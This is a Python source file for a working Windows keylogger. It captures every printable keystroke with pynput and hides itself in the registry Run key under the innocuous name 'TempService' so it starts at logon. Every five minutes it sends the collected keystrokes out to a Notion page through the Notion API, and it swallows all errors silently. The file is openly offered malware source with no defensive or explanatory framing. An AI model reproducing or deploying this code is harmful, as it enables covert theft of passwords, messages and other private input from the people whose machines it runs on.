from pynput import keyboard
import time
import requests
import winreg
import os
import sys

# Notion credentials
NOTION_TOKEN = "your-notion-key"
PAGE_ID = "your-page-id"

# Notion API endpoint
url = f"https://api.notion.com/v1/blocks/{PAGE_ID}/children"
headers = {
    "Authorization": f"Bearer {NOTION_TOKEN}",
    "Content-Type": "application/json",
    "Notion-Version": "2022-06-28"
}

log = ""

# Get the path of the script/exe
if getattr(sys, 'frozen', False):
    ORIGINAL_PATH = sys.executable
else:
    ORIGINAL_PATH = os.path.abspath(__file__)

def add_to_startup():
    try:
        key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        reg_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(reg_key, "TempService", 0, winreg.REG_SZ, f'"{ORIGINAL_PATH}"')
        winreg.CloseKey(reg_key)
    except Exception as e:
        pass

add_to_startup()

def on_press(key):
    global log
    try:
        if key.char.isprintable():
            log += key.char
    except AttributeError:
        if key == keyboard.Key.enter:
            log += "\n"
        elif key == keyboard.Key.space:
            log += " "

def update_notion():
    global log
    if log:
        data = {
            "children": [
                {
                    "object": "block",
                    "type": "paragraph",
                    "paragraph": {
                        "rich_text": [{
                            "type": "text",
                            "text": {
                                "content": log
                            }
                        }]
                    }
                }
            ]
        }
        try:
            response = requests.patch(url, headers=headers, json=data)
            response.raise_for_status()
            log = ""
        except Exception as e:
            pass

listener = keyboard.Listener(on_press=on_press)
listener.start()

while True:
    time.sleep(300)
    update_notion()